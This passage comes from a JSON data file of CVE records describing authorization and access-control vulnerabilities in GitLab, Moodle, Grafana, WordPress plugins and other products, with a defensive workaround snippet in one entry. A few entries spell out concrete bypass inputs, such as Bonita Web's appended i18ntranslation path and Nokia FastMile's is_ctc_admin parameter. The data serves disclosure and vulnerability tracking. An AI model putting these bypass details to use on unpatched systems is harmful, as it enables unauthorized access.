GitLab EE versions 13.11.6, 13.12.6, and 14.0.2 allows users to be created via single sign on despite user cap being enabled"}, {"Reference": "CVE-2021-35112", "Description": "A user with user level permission can access graphics protected region due to improper access control in register configuration in Snapdragon Auto, Snapdragon Compute, Snapdragon Connectivity, Snapdragon Consumer IOT, Snapdragon Industrial IOT, Snapdragon Mobile, Snapdragon Voice & Music, Snapdragon Wearables"}, {"Reference": "CVE-2021-37409", "Description": "Improper access control for some Intel(R) PROSet/Wireless WiFi and Killer(TM) WiFi products may allow a privileged user to potentially enable escalation of privilege via local access."}, {"Reference": "CVE-2022-0574", "Description": "Improper Access Control in GitHub repository publify/publify prior to 9.2.8."}, {"Reference": "CVE-2022-1944", "Description": "When the feature is configured, improper authorization in the Interactive Web Terminal in GitLab CE/EE affecting all versions from 11.3 prior to 14.9.5, 14.10 prior to 14.10.4, and 15.0 prior to 15.0.1 allows users with the Developer role to open terminals on other Developers' running jobs"}, {"Reference": "CVE-2022-2095", "Description": "An improper access control check in GitLab CE/EE affecting all versions starting from 13.7 before 15.0.5, all versions starting from 15.1 before 15.1.4, all versions starting from 15.2 before 15.2.1 allows a malicious authenticated user to view a public project's Deploy Key's public fingerprint and name when that key has write permission. Note that GitLab never asks for nor stores the private key."}, {"Reference": "CVE-2022-23488", "Description": "BigBlueButton is an open source web conferencing system. Versions prior to 2.4-rc-6 are vulnerable to Insertion of Sensitive Information Into Sent Data. The moderators-only webcams lock setting is not enforced on the backend, which allows an attacker to subscribe to viewers' webcams, even when the lock setting is applied. (The required streamId was being sent to all users even with lock setting applied). This issue is fixed in version 2.4-rc-6. There are no workarounds."}, {"Reference": "CVE-2022-0406", "Description": "Improper Authorization in GitHub repository janeczku/calibre-web prior to 0.6.16."}, {"Reference": "CVE-2021-45896", "Description": "Nokia FastMile 3TG00118ABAD52 devices allow privilege escalation by an authenticated user via is_ctc_admin=1 to login_web_app.cgi and use of Import Config File."}, {"Reference": "CVE-2022-35921", "Description": "fof/byobu is a private discussions extension for Flarum forum. Affected versions were found to not respect private discussion disablement by users. Users of Byobu should update the extension to version 1.1.7, where this has been patched. Users of Byobu with Flarum 1.0 or 1.1 should upgrade to Flarum 1.2 or later, or evaluate the impact this issue has on your forum's users and choose to disable the extension if needed. There are no workarounds for this issue."}, {"Reference": "CVE-2022-41923", "Description": "Grails Spring Security Core plugin is vulnerable to privilege escalation. The vulnerability allows an attacker access to one endpoint (i.e. the targeted endpoint) using the authorization requirements of a different endpoint (i.e. the donor endpoint). In some Grails framework applications, access to the targeted endpoint will be granted based on meeting the authorization requirements of the donor endpoint, which can result in a privilege escalation attack. This vulnerability has been patched in grails-spring-security-core versions 3.3.2, 4.0.5 and 5.1.1. Impacted Applications: Grails Spring Security Core plugin versions: 1.x 2.x >=3.0.0 <3.3.2 >=4.0.0 <4.0.5 >=5.0.0 <5.1.1 We strongly suggest that all Grails framework applications using the Grails Spring Security Core plugin be updated to a patched release of the plugin. Workarounds: Users should create a subclass extending one of the following classes from the `grails.plugin.springsecurity.web.access.intercept` package, depending on their security configuration: * `AnnotationFilterInvocationDefinition` * `InterceptUrlMapFilterInvocationDefinition` * `RequestmapFilterInvocationDefinition` In each case, the subclass should override the `calculateUri` method like so: ``` @Override protected String calculateUri(HttpServletRequest request) { UrlPathHelper.defaultInstance.getRequestUri(request) } ``` This should be considered a temporary measure, as the patched versions of grails-spring-security-core deprecates the `calculateUri` method. Once upgraded to a patched version of the plugin, this workaround is no longer needed. The workaround is especially important for version 2.x, as no patch is available version 2.x of the GSSC plugin."}, {"Reference": "CVE-2022-0580", "Description": "Incorrect Authorization in Packagist librenms/librenms prior to 22.2.0. "}, {"Reference": "CVE-2022-1223", "Description": "Incorrect Authorization in GitHub repository phpipam/phpipam prior to 1.4.6. "}, {"Reference": "CVE-2022-0117", "Description": "Policy bypass in Blink in Google Chrome prior to 97.0.4692.71 allowed a remote attacker to leak cross-origin data via a crafted HTML page."}, {"Reference": "CVE-2022-0334", "Description": "A flaw was found in Moodle in versions 3.11 to 3.11.4, 3.10 to 3.10.8, 3.9 to 3.9.11 and earlier unsupported versions. Insufficient capability checks could lead to users accessing their grade report for courses where they did not have the required gradereport/user:view capability."}, {"Reference": "CVE-2022-0762", "Description": "Incorrect Authorization in GitHub repository microweber/microweber prior to 1.3. "}, {"Reference": "CVE-2022-36074", "Description": "Nextcloud server is an open source personal cloud product. Affected versions of this package are vulnerable to Information Exposure which fails to strip the Authorization header on HTTP downgrade. This can lead to account access exposure and compromise. It is recommended that the Nextcloud Server is upgraded to 23.0.7 or 24.0.3. It is recommended that the Nextcloud Enterprise Server is upgraded to 22.2.11, 23.0.7 or 24.0.3. There are no known workarounds for this issue."}, {"Reference": "CVE-2022-24783", "Description": "Deno is a runtime for JavaScript and TypeScript. The versions of Deno between release 1.18.0 and 1.20.2 (inclusive) are vulnerable to an attack where a malicious actor controlling the code executed in a Deno runtime could bypass all permission checks and execute arbitrary shell code. This vulnerability does not affect users of Deno Deploy. The vulnerability has been patched in Deno 1.20.3. There is no workaround. All users are recommended to upgrade to 1.20.3 immediately."}, {"Reference": "CVE-2022-25318", "Description": "An issue was discovered in Cerebrate through 1.4. An incorrect sharing group ACL allowed an unprivileged user to edit and modify sharing groups."}, {"Reference": "CVE-2022-27575", "Description": "Information exposure vulnerability in One UI Home prior to SMR April-2022 Release 1 allows to access currently launched foreground app information without permission."}, {"Reference": "CVE-2022-35716", "Description": "IBM UrbanCode Deploy (UCD) 6.2.0.0 through 6.2.7.16, 7.0.0.0 through 7.0.5.11, 7.1.0.0 through 7.1.2.7, and 7.2.0.0 through 7.2.3.0 could allow an authenticated user to obtain sensitive information in some instances due to improper security checking. IBM X-Force ID: 231360."}, {"Reference": "CVE-2022-2408", "Description": "The Guest account feature in Mattermost version 6.7.0 and earlier fails to properly restrict the permissions, which allows a guest user to fetch a list of all public channels in the team, in spite of not being part of those channels."}, {"Reference": "CVE-2022-0985", "Description": "Insufficient capability checks could allow users with the moodle/site:uploadusers capability to delete users, without having the necessary moodle/user:delete capability."}, {"Reference": "CVE-2022-1460", "Description": "An issue has been discovered in GitLab affecting all versions starting from 9.2 before 14.8.6, all versions starting from 14.9 before 14.9.4, all versions starting from 14.10 before 14.10.1. GitLab was not performing correct authorizations on scheduled pipelines allowing a malicious user to run a pipeline in the context of another user."}, {"Reference": "CVE-2022-23654", "Description": "Wiki.js is a wiki app built on Node.js. In affected versions an authenticated user with write access on a restricted set of paths can update a page outside the allowed paths by specifying a different target page ID while keeping the path intact. The access control incorrectly check the path access against the user-provided values instead of the actual path associated to the page ID. Commit https://github.com/Requarks/wiki/commit/411802ec2f654bb5ed1126c307575b81e2361c6b fixes this vulnerability by checking access control on the path associated with the page ID instead of the user-provided value. When the path is different than the current value, a second access control check is then performed on the user-provided path before the move operation."}, {"Reference": "CVE-2022-24748", "Description": "Shopware is an open commerce platform based on the Symfony php Framework and the Vue javascript framework. In versions prior to 6.4.8.2 it is possible to modify customers and to create orders without App Permission. This issue is a result of improper api route checking. Users are advised to upgrade to version 6.4.8.2. There are no known workarounds."}, {"Reference": "CVE-2022-25335", "Description": "RigoBlock Dragos through 2022-02-17 lacks the onlyOwner modifier for setMultipleAllowances. This enables token manipulation, as exploited in the wild in February 2022. NOTE: although 2022-02-17 is the vendor's vulnerability announcement date, the vulnerability will not be remediated until a major protocol upgrade occurs."}, {"Reference": "CVE-2022-36103", "Description": "Talos Linux is a Linux distribution built for Kubernetes deployments. Talos worker nodes use a join token to get accepted into the Talos cluster. Due to improper validation of the request while signing a worker node CSR (certificate signing request) Talos control plane node might issue Talos API certificate which allows full access to Talos API on a control plane node. Accessing Talos API with full level access on a control plane node might reveal sensitive information which allows full level access to the cluster (Kubernetes and Talos PKI, etc.). Talos API join token is stored in the machine configuration on the worker node. When configured correctly, Kubernetes workloads don't have access to the machine configuration, but due to a misconfiguration workload might access the machine configuration and reveal the join token. This problem has been fixed in Talos 1.2.2. Enabling the Pod Security Standards mitigates the vulnerability by denying hostPath mounts and host networking by default in the baseline policy. Clusters that don't run untrusted workloads are not affected. Clusters with correct Pod Security configurations which don't allow hostPath mounts, and secure access to cloud metadata server (or machine configuration is not supplied via cloud metadata server) are not affected."}, {"Reference": "CVE-2022-46792", "Description": "Hasura GraphQL Engine before 2.15.2 mishandles row-level authorization in the Update Many API for Postgres backends. The fixed versions are 2.10.2, 2.11.3, 2.12.1, 2.13.2, 2.14.1, and 2.15.2. (Versions before 2.10.0 are unaffected.)"}, {"Reference": "CVE-2022-20396", "Description": "In SettingsActivity.java, there is a possible way to make a device discoverable over Bluetooth, without permission or user interaction, due to a permissions bypass. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-12L Android-13Android ID: A-234440688"}, {"Reference": "CVE-2022-3048", "Description": "Inappropriate implementation in Chrome OS lockscreen in Google Chrome on Chrome OS prior to 105.0.5195.52 allowed a local attacker to bypass lockscreen navigation restrictions via physical access to the device."}, {"Reference": "CVE-2021-30538", "Description": "Insufficient policy enforcement in content security policy in Google Chrome prior to 91.0.4472.77 allowed a remote attacker to bypass content security policy via a crafted HTML page."}, {"Reference": "CVE-2021-30539", "Description": "Insufficient policy enforcement in content security policy in Google Chrome prior to 91.0.4472.77 allowed a remote attacker to bypass content security policy via a crafted HTML page."}, {"Reference": "CVE-2021-31876", "Description": "Bitcoin Core 0.12.0 through 0.21.1 does not properly implement the replacement policy specified in BIP125, which makes it easier for attackers to trigger a loss of funds, or a denial of service attack against downstream projects such as Lightning network nodes. An unconfirmed child transaction with nSequence = 0xff_ff_ff_ff, spending an unconfirmed parent with nSequence <= 0xff_ff_ff_fd, should be replaceable because there is inherited signaling by the child transaction. However, the actual PreChecks implementation does not enforce this. Instead, mempool rejects the replacement attempt of the unconfirmed child transaction."}, {"Reference": "CVE-2021-35368", "Description": "OWASP ModSecurity Core Rule Set 3.1.x before 3.1.2, 3.2.x before 3.2.1, and 3.3.x before 3.3.2 is affected by a Request Body Bypass via a trailing pathname."}, {"Reference": "CVE-2021-3763", "Description": "A flaw was found in the Red Hat AMQ Broker management console in version 7.8 where an existing user is able to access some limited information even when the role the user is assigned to should not be allow access to the management console. The main impact is to confidentiality as this flaw means some role bindings are incorrectly checked, some privileged meta information such as queue names and configuration details are disclosed but the impact is limited as not all information is accessible and there is no affect to integrity."}, {"Reference": "CVE-2021-39206", "Description": "Pomerium is an open source identity-aware access proxy. Envoy, which Pomerium is based on, contains two authorization related vulnerabilities CVE-2021-32777 and CVE-2021-32779. This may lead to incorrect routing or authorization policy decisions. With specially crafted requests, incorrect authorization or routing decisions may be made by Pomerium. Pomerium v0.14.8 and v0.15.1 contain an upgraded envoy binary with these vulnerabilities patched. This issue can only be triggered when using path prefix based policy. Removing any such policies should provide mitigation."}, {"Reference": "CVE-2022-0333", "Description": "A flaw was found in Moodle in versions 3.11 to 3.11.4, 3.10 to 3.10.8, 3.9 to 3.9.11 and earlier unsupported versions. The calendar:manageentries capability allowed managers to access or modify any calendar event, but should have been restricted from accessing user level events."}, {"Reference": "CVE-2022-0633", "Description": "The UpdraftPlus WordPress plugin Free before 1.22.3 and Premium before 2.22.3 do not properly validate a user has the required privileges to access a backup's nonce identifier, which may allow any users with an account on the site (such as subscriber) to download the most recent site & database backup."}, {"Reference": "CVE-2022-0740", "Description": "Incorrect authorization in the Asana integration's branch restriction feature in all versions of GitLab CE/EE starting from version 7.8.0 before 14.7.7, all versions starting from 14.8 before 14.8.5, all versions starting from 14.9 before 14.9.2 makes it possible to close Asana tasks from unrestricted branches."}, {"Reference": "CVE-2022-0825", "Description": "The Amelia WordPress plugin before 1.0.49 does not have proper authorisation when managing appointments, allowing any customer to update other's booking status, as well as retrieve sensitive information about the bookings, such as the full name and phone number of the person who booked it."}, {"Reference": "CVE-2022-1935", "Description": "Incorrect authorization in GitLab EE affecting all versions from 12.0 before 14.9.5, all versions starting from 14.10 before 14.10.4, all versions starting from 15.0 before 15.0.1 allowed an attacker already in possession of a valid Project Trigger Token to misuse it from any location even when IP address restrictions were configured"}, {"Reference": "CVE-2022-1936", "Description": "Incorrect authorization in GitLab EE affecting all versions from 12.0 before 14.9.5, all versions starting from 14.10 before 14.10.4, all versions starting from 15.0 before 15.0.1 allowed an attacker already in possession of a valid Project Deploy Token to misuse it from any location even when IP address restrictions were configured"}, {"Reference": "CVE-2022-1981", "Description": "An issue has been discovered in GitLab EE affecting all versions starting from 12.2 prior to 14.10.5, 15.0 prior to 15.0.4, and 15.1 prior to 15.1.1. In GitLab, if a group enables the setting to restrict access to users belonging to specific domains, that allow-list may be bypassed if a Maintainer uses the 'Invite a group' feature to invite a group that has members that don't comply with domain allow-list."}, {"Reference": "CVE-2022-21701", "Description": "Istio is an open platform to connect, manage, and secure microservices. In versions 1.12.0 and 1.12.1 Istio is vulnerable to a privilege escalation attack. Users who have `CREATE` permission for `gateways.gateway.networking.k8s.io` objects can escalate this privilege to create other resources that they may not have access to, such as `Pod`. This vulnerability impacts only an Alpha level feature, the Kubernetes Gateway API. This is not the same as the Istio Gateway type (gateways.networking.istio.io), which is not vulnerable. Users are advised to upgrade to resolve this issue. Users unable to upgrade should implement any of the following which will prevent this vulnerability: Remove the gateways.gateway.networking.k8s.io CustomResourceDefinition, set PILOT_ENABLE_GATEWAY_API_DEPLOYMENT_CONTROLLER=true environment variable in Istiod, or remove CREATE permissions for gateways.gateway.networking.k8s.io objects from untrusted users."}, {"Reference": "CVE-2022-22326", "Description": "IBM Datapower Gateway 10.0.2.0 through 10.0.4.0, 10.0.1.0 through 10.0.1.5, and 2018.4.1.0 through 2018.4.1.18 could allow unauthorized viewing of logs and files due to insufficient authorization checks. IBM X-Force ID: 218856."}, {"Reference": "CVE-2022-23490", "Description": "BigBlueButton is an open source web conferencing system. Versions prior to 2.4.0 expose sensitive information to Unauthorized Actors. This issue affects meetings with polls, where the attacker is a meeting participant. Subscribing to the current-poll collection does not update the client UI, but does give the attacker access to the contents of the collection, which include the individual poll responses. This issue is patched in version 2.4.0. There are no workarounds. "}, {"Reference": "CVE-2022-23553", "Description": "Alpine is a scaffolding library in Java. Alpine prior to version 1.10.4 allows URL access filter bypass. This issue has been fixed in version 1.10.4. There are no known workarounds."}, {"Reference": "CVE-2022-23615", "Description": "XWiki Platform is a generic wiki platform offering runtime services for applications built on top of it. In affected versions any user with SCRIPT right can save a document with the right of the current user which allow accessing API requiring programming right if the current user has programming right. This has been patched in XWiki 13.0. Users are advised to update to resolve this issue. The only known workaround is to limit SCRIPT access."}, {"Reference": "CVE-2022-23627", "Description": "ArchiSteamFarm (ASF) is a C# application with primary purpose of idling Steam cards from multiple accounts simultaneously. Due to a bug in ASF code, introduced in version V5.2.2.2, the program didn't adequately verify effective access of the user sending proxy (i.e. `[Bots]`) commands. In particular, a proxy-like command sent to bot `A` targeting bot `B` has incorrectly verified user's access against bot `A` - instead of bot `B`, to which the command was originally designated. This in result allowed access to resources beyond those configured, being a security threat affecting confidentiality of other bot instances. A successful attack exploiting this bug requires a significant access granted explicitly by original owner of the ASF process prior to that, as attacker has to control at least a single bot in the process to make use of this inadequate access verification loophole. The issue is patched in ASF V5.2.2.5, V5.2.3.2 and future versions. Users are advised to update as soon as possible."}, {"Reference": "CVE-2022-23739", "Description": "An incorrect authorization vulnerability was identified in GitHub Enterprise Server, allowing for escalation of privileges in GraphQL API requests from GitHub Apps. This vulnerability allowed an app installed on an organization to gain access to and modify most organization-level resources that are not tied to a repository regardless of granted permissions, such as users and organization-wide projects. Resources associated with repositories were not impacted, such as repository file content, repository-specific projects, issues, or pull requests. This vulnerability affected all versions of GitHub Enterprise Server prior to 3.7.1 and was fixed in versions 3.3.16, 3.4.11, 3.5.8, 3.6.4, 3.7.1. This vulnerability was reported via the GitHub Bug Bounty program."}, {"Reference": "CVE-2022-23741", "Description": "An incorrect authorization vulnerability was identified in GitHub Enterprise Server that allowed a scoped user-to-server token to escalate to full admin/owner privileges. An attacker would require an account with admin access to install a malicious GitHub App. This vulnerability was fixed in versions 3.3.17, 3.4.12, 3.5.9, and 3.6.5. This vulnerability was reported via the GitHub Bug Bounty program."}, {"Reference": "CVE-2022-23773", "Description": "cmd/go in Go before 1.16.14 and 1.17.x before 1.17.7 can misinterpret branch names that falsely appear to be version tags. This can lead to incorrect access control if an actor is supposed to be able to create branches but not tags."}, {"Reference": "CVE-2022-24307", "Description": "Mastodon before 3.3.2 and 3.4.x before 3.4.6 has incorrect access control because it does not compact incoming signed JSON-LD activities. (JSON-LD signing has been supported since version 1.6.0.)"}, {"Reference": "CVE-2022-2456", "Description": "An issue has been discovered in GitLab CE/EE affecting all versions before 15.0.5, all versions starting from 15.1 before 15.1.4, all versions starting from 15.2 before 15.2.1. It may be possible for malicious group or project maintainers to change their corresponding group or project visibility by crafting a malicious POST request."}, {"Reference": "CVE-2022-24714", "Description": "Icinga Web 2 is an open source monitoring web interface, framework and command-line interface. Installations of Icinga 2 with the IDO writer enabled are affected. If you use service custom variables in role restrictions, and you regularly decommission service objects, users with said roles may still have access to a collection of content. Note that this only applies if a role has implicitly permitted access to hosts, due to permitted access to at least one of their services. If access to a host is permitted by other means, no sensible information has been disclosed to unauthorized users. This issue has been resolved in versions 2.8.6, 2.9.6 and 2.10 of Icinga Web 2."}, {"Reference": "CVE-2022-24721", "Description": "CometD is a scalable comet implementation for web messaging. In any version prior to 5.0.11, 6.0.6, and 7.0.6, internal usage of Oort and Seti channels is improperly authorized, so any remote user could subscribe and publish to those channels. By subscribing to those channels, a remote user may be able to watch cluster-internal traffic that contains other users' (possibly sensitive) data. By publishing to those channels, a remote user may be able to create/modify/delete other user's data and modify the cluster structure. A fix is available in versions 5.0.11, 6.0.6, and 7.0.6. As a workaround, install a custom `SecurityPolicy` that forbids subscription and publishing to remote, non-Oort, sessions on Oort and Seti channels."}, {"Reference": "CVE-2022-25237", "Description": "Bonita Web 2021.2 is affected by a authentication/authorization bypass vulnerability due to an overly broad exclude pattern used in the RestAPIAuthorizationFilter. By appending ;i18ntranslation or /../i18ntranslation/ to the end of a URL, users with no privileges can access privileged API endpoints. This can lead to remote code execution by abusing the privileged API actions."}, {"Reference": "CVE-2022-2597", "Description": "The Visual Portfolio, Photo Gallery & Post Grid WordPress plugin before 2.19.0 does not have proper authorisation checks in some of its REST endpoints, allowing users with a role as low as contributor to call them and inject arbitrary CSS in arbitrary saved layouts"}, {"Reference": "CVE-2022-26767", "Description": "The issue was addressed with additional permissions checks. This issue is fixed in macOS Monterey 12.4, macOS Big Sur 11.6.6. A malicious application may be able to bypass Privacy preferences."}, {"Reference": "CVE-2022-27551", "Description": "HCL Launch could allow an authenticated user to obtain sensitive information in some instances due to improper security checking."}, {"Reference": "CVE-2022-27608", "Description": "Forcepoint One Endpoint prior to version 22.01 installed on Microsoft Windows is vulnerable to registry key tampering by users with Administrator privileges. This could result in a user disabling anti-tampering mechanisms which would then allow the user to disable Forcepoint One Endpoint and the protection offered by it."}, {"Reference": "CVE-2022-27609", "Description": "Forcepoint One Endpoint prior to version 22.01 installed on Microsoft Windows does not provide sufficient anti-tampering protection of services by users with Administrator privileges. This could result in a user disabling Forcepoint One Endpoint and the protection offered by it."}, {"Reference": "CVE-2022-27668", "Description": "Depending on the configuration of the route permission table in file 'saprouttab', it is possible for an unauthenticated attacker to execute SAProuter administration commands in SAP NetWeaver and ABAP Platform - versions KERNEL 7.49, 7.77, 7.81, 7.85, 7.86, 7.87, 7.88, KRNL64NUC 7.49, KRNL64UC 7.49, SAP_ROUTER 7.53, 7.22, from a remote client, for example stopping the SAProuter, that could highly impact systems availability."}, {"Reference": "CVE-2022-31039", "Description": "Greenlight is a simple front-end interface for your BigBlueButton server. In affected versions an attacker can view any room's settings even though they are not authorized to do so. Only the room owner and administrator should be able to view a room's settings. This issue has been patched in release version 2.12.6."}, {"Reference": "CVE-2022-31107", "Description": "Grafana is an open-source platform for monitoring and observability. In versions 5.3 until 9.0.3, 8.5.9, 8.4.10, and 8.3.10, it is possible for a malicious user who has authorization to log into a Grafana instance via a configured OAuth IdP which provides a login name to take over the account of another user in that Grafana instance. This can occur when the malicious user is authorized to log in to Grafana via OAuth, the malicious user's external user id is not already associated with an account in Grafana, the malicious user's email address is not already associated with an account in Grafana, and the malicious user knows the Grafana username of the target user. If these conditions are met, the malicious user can set their username in the OAuth provider to that of the target user, then go through the OAuth flow to log in to Grafana. Due to the way that external and internal user accounts are linked together during login, if the conditions above are all met then the malicious user will be able to log in to the target user's Grafana account. Versions 9.0.3, 8.5.9, 8.4.10, and 8.3.10 contain a patch for this issue. As a workaround, concerned users can disable OAuth login to their Grafana instance, or ensure that all users authorized to log in via OAuth have a corresponding user account in Grafana linked to their email address."}, {"Reference": "CVE-2022-31155", "Description": "Sourcegraph is an opensource code search and navigation engine. In Sourcegraph versions before 3.41.0, it is possible for an attacker to delete other users\u2019 saved searches due to a bug in the authorization check. The vulnerability does not allow the reading of other users\u2019 saved searches, only overwriting them with attacker-controlled searches. The issue is patched in Sourcegraph version 3.41.0. There is no workaround for this issue and updating to a secure version is highly recommended."}, {"Reference": "CVE-2022-31168", "Description": "Zulip is an open source team chat tool. Due to an incorrect authorization check in Zulip Server 5.4 and earlier, a member of an organization could craft an API call that grants organization administrator privileges to one of their bots. The vulnerability is fixed in Zulip Server 5.5. Members who don\u2019t own any bots, and lack permission to create them, can\u2019t exploit the vulnerability. As a workaround for the vulnerability, an organization administrator can restrict the `Who can create bots` permission to administrators only, and change the ownership of existing bots."}, {"Reference": "CVE-2022-39214", "Description": "Combodo iTop is an open source, web-based IT service management platform. Prior to versions 2.7.8 and 3.0.2-1, a user who can log in on iTop is able to take over any account just by knowing the account's username. This issue is fixed in versions 2.7.8 and 3.0.2-1."}, {"Reference": "CVE-2022-39302", "Description": "Ree6 is a moderation bot. This vulnerability would allow other server owners to create configurations such as \"Better-Audit-Logging\" which contain a channel from another server as a target. This would mean you could send log messages to another Guild channel and bypass raid and webhook protections. A specifically crafted log message could allow spamming and mass advertisements. This issue has been patched in version 1.9.9. There are currently no known workarounds."}, {"Reference": "CVE-2022-39322", "Description": "@keystone-6/core is a core package for Keystone 6, a content management system for Node.js. Starting with version 2.2.0 and prior to version 2.3.1, users who expected their `multiselect` fields to use the field-level access control - if configured - are vulnerable to their field-level access control not being used. List-level access control is not affected. Field-level access control for fields other than `multiselect` are not affected. Version 2.3.1 contains a fix for this issue. As a workaround, stop using the `multiselect` field."}, {"Reference": "CVE-2022-41274", "Description": "SAP Disclosure Management - version 10.1, allows an authenticated attacker to exploit certain misconfigured application endpoints to read sensitive data. These endpoints are normally exposed over the network and successful exploitation can lead to the exposure of data like financial reports."}, {"Reference": "CVE-2022-4167", "Description": "Incorrect Authorization check affecting all versions of GitLab EE from 13.11 prior to 15.5.7, 15.6 prior to 15.6.4, and 15.7 prior to 15.7.2 allows group access tokens to continue working even after the group owner loses the ability to revoke them."}, {"Reference": "CVE-2022-41962", "Description": "BigBlueButton is an open source web conferencing system. Versions prior to 2.4-rc-6, and 2.5-alpha-1 contain Incorrect Authorization for setting emoji status. A user with moderator rights can use the clear status feature to set any emoji status for other users. Moderators should only be able to set none as the status of other users. This issue is patched in 2.4-rc-6 and 2.5-alpha-1There are no workarounds."}, {"Reference": "CVE-2022-42351", "Description": "Adobe Experience Manager version 6.5.14 (and earlier) is affected by an Incorrect Authorization vulnerability that could result in a security feature bypass. A low-privileged attacker could leverage this vulnerability to disclose low level confidentiality information. Exploitation of this issue does not require user interaction."}, {"Reference": "CVE-2022-42978", "Description": "In the Netic User Export add-on before 1.3.5 for Atlassian Confluence, authorization is mishandled. An unauthenticated attacker could access files on the remote system."}, {"Reference": "CVE-2022-43438", "Description": "The Administrator function of EasyTest has an Incorrect Authorization vulnerability. A remote attacker authenticated as a general user can exploit this vulnerability to bypass the intended access restrictions, to make API functions calls, manipulate system and terminate service."}, {"Reference": "CVE-2022-43872", "Description": " IBM Financial Transaction Manager 3.2.4 authorization checks are done incorrectly for some HTTP requests which allows getting unauthorized technical information (e.g. event log entries) about the FTM SWIFT system. IBM X-Force ID: 239708. "}, {"Reference": "CVE-2022-45172", "Description": "An issue was discovered in LIVEBOX Collaboration vDesk before v018. Broken Access Control can occur under the /api/v1/registration/validateEmail endpoint, the /api/v1/vdeskintegration/user/adduser endpoint, and the /api/v1/registration/changePasswordUser endpoint. The web application is affected by flaws in authorization logic, through which a malicious user (with no privileges) is able to perform privilege escalation to the administrator role, and steal the accounts of any users on the system."}, {"Reference": "CVE-2022-45353", "Description": "Broken Access Control in Betheme theme <= 26.6.1 on WordPress. "}, {"Reference": "CVE-2022-45435", "Description": "IdentityIQ 8.3 and all 8.3 patch levels prior to 8.3p2, IdentityIQ 8.2 and all 8.2 patch levels prior to 8.2p5, IdentityIQ 8.1 and all 8.1 patch levels prior to 8.1p7, IdentityIQ 8.0 and all 8.0 patch levels prior to 8.0p6, and all prior versions allow authenticated users assigned the Identity Administrator capability or any custom capability that contains the SetIdentityForwarding right to modify the work item forwarding configuration for identities other than the ones that should be allowed by Lifecycle Manager Quicklink Population configuration."}, {"Reference": "CVE-2022-45891", "Description": "Planet eStream before 6.72.10.07 allows attackers to call restricted functions, and perform unauthenticated uploads (Upload2.ashx) or access content uploaded by other users (View.aspx after Ajax.asmx/SaveGrantAccessList)."}, {"Reference": "CVE-2022-45956", "Description": "Boa Web Server versions 0.94.13 through 0.94.14 fail to validate the correct security constraint on the HEAD HTTP method allowing everyone to bypass the Basic Authorization mechanism."}, {"Reference": "CVE-2022-46160", "Description": "Tuleap is an Open Source Suite to improve management of software developments and collaboration. In versions prior to 14.2.99.104, project level authorizations are not properly verified when accessing the project \"homepage\"/dashboards. Users not authorized to access a project may still be able to get some information provided by the widgets (e.g. number of members, content of the Notes widget...). This issue has been patched in Tuleap Community Edition 14.2.99.104, Tuleap Enterprise Edition 14.2-4, and Tuleap Enterprise Edition 14.1-5."}, {"Reference": "CVE-2022-46258", "Description": "An incorrect authorization vulnerability was identified in GitHub Enterprise Server that allowed a repository-scoped token with read/write access to modify Action Workflow files without a Workflow scope. The Create or Update file contents API should enforce workflow scope. This vulnerability affected all versions of GitHub Enterprise Server prior to version 3.7 and was fixed in versions 3.3.16, 3.4.11, 3.5.8, and 3.6.4. This vulnerability was reported via the GitHub Bug Bounty program."}, {"Reference": "CVE-2021-40692", "Description": "Insufficient capability checks made it possible for teachers to download users outside of their courses."}, {"Reference": "CVE-2022-0594", "Description": "The Professional Social Sharing Buttons, Icons & Related Posts WordPress plugin before 9.7.6 does not have proper authorisation check in one of the AJAX action, available to unauthenticated (in v < 9.7.5) and author+ (in v9.7.5) users, allowing them to call it and retrieve various information such as the list of active plugins, various version like PHP, cURL, WP etc."}, {"Reference": "CVE-2022-0720", "Description": "The Amelia WordPress plugin before 1.0.47 does not have proper authorisation when managing appointments, allowing any customer to update other's booking, as well as retrieve sensitive information about the bookings, such as the full name and phone number of the person who booked it."}, {"Reference": "CVE-2022-0920", "Description": "The Salon booking system Free and Pro WordPress plugins before 7.6.3 do not have proper authorisation in some of its endpoints, which could allow customers to access all bookings and other customer's data"}, {"Reference": "CVE-2022-0984", "Description": "Users with the capability to configure badge criteria (teachers and managers by default) were able to configure course badges with profile field criteria, which should only be available for site badges."}, {"Reference": "CVE-2022-20928", "Description": "A vulnerability in the authentication and authorization flows for VPN connections in Cisco Adaptive Security Appliance (ASA) Software and Firepower Threat Defense (FTD) Software could allow an unauthenticated, remote attacker to establish a connection as a different user. This vulnerability is due to a flaw in the authorization verifications during the VPN authentication flow. An attacker could exploit this vulnerability by sending a crafted packet during a VPN authentication. The attacker must have valid credentials to establish a VPN connection. A successful exploit could allow the attacker to establish a VPN connection with access privileges from a different user."}, {"Reference": "CVE-2022-20942", "Description": "A vulnerability in the web-based management interface of Cisco Email Security Appliance (ESA), Cisco Secure Email and Web Manager, and Cisco Secure Web Appliance, formerly known as Cisco Web Security Appliance (WSA), could allow an authenticated, remote attacker to retrieve sensitive information from an affected device, including user credentials. This vulnerability is due to weak enforcement of back-end authorization checks. An attacker could exploit this vulnerability by sending a crafted HTTP request to an affected device. A successful exploit could allow the attacker to obtain confidential data that is stored on the affected device."}, {"Reference": "CVE-2022-21141", "Description": "MMP: All versions prior to v1.0.3, PTP C-series: Device versions prior to v2.8.6.1, and PTMP C-series and A5x: Device versions prior to v2.5.4.1 does not perform proper authorization checks on multiple API functions. An attacker may gain access to these functions and achieve remote code execution, create a denial-of-service condition, and obtain sensitive information."}, {"Reference": "CVE-2022-22157", "Description": "A traffic classification vulnerability in Juniper Networks Junos OS on the SRX Series Services Gateways may allow an attacker to bypass Juniper Deep Packet Inspection (JDPI) rules and access unauthorized networks or resources, when 'no-syn-check' is enabled on the device. JDPI incorrectly classifies out-of-state asymmetric TCP flows as the dynamic-application INCONCLUSIVE instead of UNKNOWN, which is more permissive, causing the firewall to allow traffic to be forwarded that should have been denied. This issue only occurs when 'set security flow tcp-session no-syn-check' is configured on the device. This issue affects Juniper Networks Junos OS on SRX Series: 18.4 versions prior to 18.4R2-S9, 18.4R3-S9; 19.1 versions prior to 19.1R2-S3, 19.1R3-S6; 19.2 versions prior to 19.2R1-S7, 19.2R3-S3; 19.3 versions prior to 19.3R2-S6, 19.3R3-S2; 19.4 versions prior to 19.4R2-S5, 19.4R3-S3; 20.1 versions prior to 20.1R2-S2, 20.1R3; 20.2 versions prior to 20.2R3-S1; 20.3 versions prior to 20.3R3; 20.4 versions prior to 20.4R2-S1, 20.4R3; 21.1 versions prior to 21.1R1-S1, 21.1R2. This issue does not affect Juniper Networks Junos OS versions prior to 18.4R1."}, {"Reference": "CVE-2022-22167", "Description": "A traffic classification vulnerability in Juniper Networks 